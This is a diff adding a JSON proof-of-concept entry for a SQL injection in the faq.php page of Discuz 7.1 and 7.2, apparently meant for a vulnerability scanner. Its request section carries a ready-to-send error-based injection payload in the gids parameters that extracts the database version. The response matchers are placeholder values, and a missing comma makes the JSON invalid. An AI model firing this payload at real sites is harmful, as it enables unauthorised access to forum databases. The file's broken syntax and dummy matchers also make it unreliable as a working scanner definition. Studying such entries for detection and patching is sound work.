@@ -1,0 +1,43 @@
+[
+{
+  "class" : "single",
+  "protocol": {
+    "name": "http",
+    "port": [80],
+    "type": ["tcp"]
+  },
+  "info": {
+    "id": "poc-2014-0003",
+    "name": "Discuz7.2 /faq.php sql注入漏洞 POC",
+    "author": ["windows95"],
+    "create_date": "2014-07-28",
+    "product": "Discuz",
+    "product_version": ["7.1", "7.2"],
+    "type": "SQL Injection",
+    "tag": ["Discuz!", "faq.php", "sql injection"],
+    "desc": "Discuz 7.1 or 7.2 has sql injection in faq.php.",
+    "references": ["http://www.wooyun.org/bugs/wooyun-2010-066095"]
+  },
+
+  "request" : {
+    "method"  : "get",
+    "uri"     : "/faq.php",
+    "params"  : {"action" : "grouppermission", "gids[99]" : "'", "gids[100][0]" : ") and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23"},
+    "headers" : {"xxx" : "yyy"}
+  },
+
+  "response" : {
+    "code"  : 200
+    "body"  : "abc",
+    "body!" : "123",
+    "regex" : "/abc/"
+  },
+
+  "result" : {
+    "status": false,
+    "data": {},
+    "error": ""
+  }
+
+}
+]
